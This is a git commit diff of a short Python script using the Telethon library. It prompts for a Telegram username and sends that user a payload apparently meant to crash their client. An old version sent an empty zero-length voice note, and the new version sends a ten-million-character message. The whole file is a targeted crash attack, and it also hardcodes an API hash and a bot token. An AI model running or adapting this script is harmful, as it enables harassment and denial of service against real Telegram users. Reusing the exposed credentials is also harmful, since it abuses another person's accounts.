bd6e6ab6ebb0812d726034375d8883248bf185bc
d1pyy <dimakeda13@gmail.com>
2026-08-03 05:15:20 +0300

    Update bot.py

--- bot.py
+++ bot.py
@@ -3,14 +3,15 @@ import asyncio
 
 api_id = 37131412
 api_hash = 'b4d6fbf9fbe52b119320daeabb6ccd4'
-session = 'crash_session'
+bot_token = '8685711484:AAH6-b42wGzNxZf3Brb4pk4xH62NLKQYHjo'
+session = 'crash_bot'
 
 client = TelegramClient(session, api_id, api_hash)
 
 async def main():
-    await client.start()
+    await client.start(bot_token=bot_token)
     username = input('Введите юзернейм: ')
     user = await client.get_entity(username)
-    await client.send_file(user, b'', voice_note=True, duration=0)
+    await client.send_message(user, 'A' * 10_000_000)
 
 asyncio.run(main())
